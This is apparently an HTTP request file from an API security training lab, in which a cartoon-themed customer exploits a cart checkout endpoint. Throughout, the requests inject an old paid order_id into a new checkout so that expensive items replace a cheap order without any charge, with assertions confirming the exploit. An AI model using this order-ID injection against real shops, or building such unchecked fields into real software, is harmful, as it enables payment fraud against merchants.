# @import ../common/setup.http
@host = {{base_host}}/v103

# The MVP proved a success, and Sandy is releasing a new cross-platform mobile app that
# customers can install on their own phones. The basic order checkout gets replaced with a
# modern cart-based checkout flow to support item modification and other features Sandy
# plans to add later.


{{
  await seedBalance("v103", "plankton", 100);
}}


### Get the menu
GET /menu

// Record the IDs of the items we'll be using.
@fries = {{response.parsedBody.find(i => i.name == "Fries")}}
@kelp_shake = {{response.parsedBody.find(i => i.name == "Kelp Shake")}}
@ultimate_krabby_feast = {{response.parsedBody.find(i => i.name == "Ultimate Krabby Feast")}}


### Plankton selects a cheap menu item (fries) in the app, which creates a new cart for him.
# @name cheap_cart
POST /cart
Authorization: {{plankton_auth}}


### A network request is sent, adding fries to the cart.
POST /cart/{{cheap_cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "{{fries.id}}" }


### Plankton finishes the checkout process, paying $2.49 for the fries.
# @name cheap_order
POST /cart/{{cheap_cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "delivery_address": "Chum Bucket"
}

?? status == 201
?? js response.parsedBody.items[0].item_id == {{fries.id}}
?? js response.parsedBody.items[0].price == {{parseFloat(fries.price)}}
// Total is $2.49 + $5.00 delivery fee = $7.49
?? js response.parsedBody.total == {{parseFloat(fries.price) + 5.00}}


### Plankton doesn't want to receive just the fries though, so he creates a new cart with expensive items.
# @name expensive_cart
POST /cart
Authorization: {{plankton_auth}}


### Plankton orders Ultimate Krabby Feast ($27.99)
POST /cart/{{expensive_cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "{{ultimate_krabby_feast.id}}" }


### ... and Kelp Shake ($3.49).
POST /cart/{{expensive_cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "{{kelp_shake.id}}" }


### Check Plankton's balance
# @name balance_before_exploit
GET /account/credits
Authorization: {{plankton_auth}}


### Plankton checks out the expensive cart but **injects his old order ID**!
POST /cart/{{expensive_cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "delivery_address": "Chum Bucket",
  "order_id": "{{cheap_order.order_id}}"
}

?? status == 201
?? js response.parsedBody.order_id == {{cheap_order.order_id}}
// The order contains expensive items!
?? js response.parsedBody.items[0].item_id == {{ultimate_krabby_feast.id}}
?? js response.parsedBody.items[1].item_id == {{kelp_shake.id}}


### The order was updated with expensive items, but Plankton wasn't charged anything!
GET /account/credits
Authorization: {{plankton_auth}}

?? js response.parsedBody.balance == {{balance_before_exploit.balance}}


### Restaurant sees updated items (Ultimate Krabby Feast and Kelp Shake) that Plankton didn't pay for.
GET /orders
X-API-Key: {{krabs_api_key}}
